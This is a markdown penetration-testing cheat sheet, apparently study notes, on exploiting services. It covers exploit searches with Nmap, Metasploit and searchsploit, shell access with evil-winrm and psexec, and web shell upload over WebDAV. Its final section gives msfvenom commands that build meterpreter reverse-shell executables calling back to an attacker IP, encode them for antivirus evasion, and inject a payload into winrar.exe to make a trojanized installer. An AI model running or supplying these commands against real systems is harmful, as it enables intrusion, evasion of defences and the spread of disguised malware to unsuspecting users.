# Exploitation

**Table of Contents:**

Exploitation of any service can be done through:

- <a href='#N'>Nmap Exploit scripts.</a>
- <a href='#M'>MsfConsole Exploit Modules.</a>
- <a href='#I'>Exploits on the Internet</a>
- <a href='#S'>Stand-Alone tools</a>
    - <a href='#winrm'>WinRM</a>
    - <a href='#webdav'>WebDAV</a>
    - <a href='#smb'>SMB</a>
- <a href='#E'>Exploitation using MsfVenom Payloads</a>

<h1 id='N'>Nmap Exploit Scripts</h1>

[https://nmap.org/nsedoc/categories/exploit.html](https://nmap.org/nsedoc/categories/exploit.html)

You can check the exploit category of each script in your local Nmap Script Database.

```bash
cat /usr/share/nmap/scripts/script.db | grep -i exploit | cut -d ' ' -f 5
```

<h1 id='M'>Msfconsole Exploit Modules</h1>

```bash
msfconsole>  search type:exploit <serviceName/software>
```

<h1 id='I'> Exploits On the Internet</h1>

Never use an exploit from a suspicious site or place, it might be the malicious one that can take over your system rather than exploiting the vulnerable service.

- [https://www.exploit-db.com/](https://www.exploit-db.com/) : Exploit DB search filters are very useful for searching exploits.
- [https://www.rapid7.com/db/](https://www.rapid7.com/db/) : Rapid7 is very helpful for finding MSF modules.

Google can be the last resort but be careful using any exploit. Check the stars or authenticity of the GitHub repo in order to use it. Always check what the code does.

[https://packetstormsecurity.com/](https://packetstormsecurity.com/) is the best website to get updates about the latest vulnerabilities and exploits.

Searchsploit is the offline version of exploit-db that comes pre-packaged with Kali. /usr/share/exploitdb, everything stores in this directory.

```bash
searchploit      #to get the complete help to use it
searchsploit remote windows smb | grep -e 'EternalBlue'
searchsploit <searchQueries> -w    #to get the exploit-db links
searchsploit -m <EDB ID>     #to copy in $(pwd)
```

You should have an idea about fixing and compiling your code for the target.

If for some reason cross-compilation isn’t successful or you don’t wanna do that then check out the Offensive security GitHub repo for the pre-compiled binaries.

[https://github.com/offensive-security/exploitdb-bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits)

<h1 id='S'>Standalone tools</h1>

<h2 id='winrm'>Winrm</h2>

After getting creds from crackmapexec you can use evil-winrm to login to the computer.

```bash
evil-winrm.rb -u <user> -p <pass> -i <IP>                        #to get a shell
```

<h2 id='webdav'>WebDav</h2>

**davtest** tool is used for testing WebDAV servers in which filetypes can be uploaded and executed.

```bash
davtest -auth <user>:<pass> -url http://<IP>/<webdavpath>
```

**cadaver** tool is used for interacting with the WebDAV server through which we can upload our web shell to the server to get system access.

```bash
cadaver http://<IP>/<webdavpath>
dav> put /usr/share/webshells/asp/webshell.asp
```

<h2 id='smb'>SMB</h2>

After getting creds of SMB, you can use psexec.py to login to the computer

```bash
psexec.py [DOMAIN/]<USERNAME>[:PASSWORD]@<HOST> [command]
```

<h1 id='E'>Exploitation using MsfVenom Payloads</h1>

```bash
msfvenom   #to get the help
msfvenom --list payloads
# windows/x64/meterpreter/reverse_tcp is a staged payload
# windows/x64/meterpreter_reverse_tcp is a non-staged payload

msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<attackerIP> LPORT=<port> -f exe > payload.exe

msfvenom --list formats

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attackerIP> LPORT=<port> -f elf > payload.elf

msf> use multi/handler   #listening for reverse connection in order to send stage for the staged payload.
```

```bash
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerIP> LPORT=<port> -e x86/shikata_ga_nai -f exe > payload.exe
#we can specify the iterations of the encoding in order to maximize our chances of evasion
#-i options for the iterations -i 10 recommended by alexis ahmed 
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerIP> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe -x winrar.exe > malicious_winrar.exe
# -k option will also maintain the actual functionality of the portable executable but -k will not work for each means injection can be failed.
# After exploiting target migrate to the stable process otherwise the current process will be closed by windows after some time due to hang
meterpreter> run post/windows/manage/migrate
```